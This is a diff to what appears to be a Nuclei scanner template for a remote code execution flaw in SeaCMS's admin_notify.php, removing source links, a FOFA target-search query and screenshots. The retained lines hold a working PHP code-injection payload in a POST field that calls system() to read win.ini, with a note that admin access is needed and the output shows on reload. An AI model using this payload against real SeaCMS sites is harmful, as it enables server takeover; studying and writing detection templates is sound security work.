@@ -3,14 +3,8 @@ info:
   name: 海洋CMS admin_notify.php 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rlk4fgrr4xia06gh
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rlk4fgrr4xia06gh
-    fofa: body="http://www.seacms.net"
 http:
 - raw:
   - 'POST /SeaCMS_12.9/Upload/pwh4pc/admin_notify.php?action=set HTTP/1.1
@@ -47,14 +41,7 @@ http:
     notify1=1";system("type C:\Windows\win.ini");;//¬ify2=2¬ify3=3
 
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1718849841561-72229289-8d09-498b-8684-27812d5e8690.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1718849841868-ff39f0f7-5665-4ece-86c3-03f9738f93d5.png)
-
-
-    后台漏洞，有后台权限的可以打， 执行后会有一个保存设置的过程然后页面跳转，需再次请求页面，查看命令执行结果，也可以使用浏览器插件一步到位，如下：
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1718849842177-a663e9ee-46f8-43f6-99f7-0ed4235dde9b.png)'
+    后台漏洞，有后台权限的可以打， 执行后会有一个保存设置的过程然后页面跳转，需再次请求页面，查看命令执行结果，也可以使用浏览器插件一步到位，如下：'
   redirects: false
   matchers:
   - status:
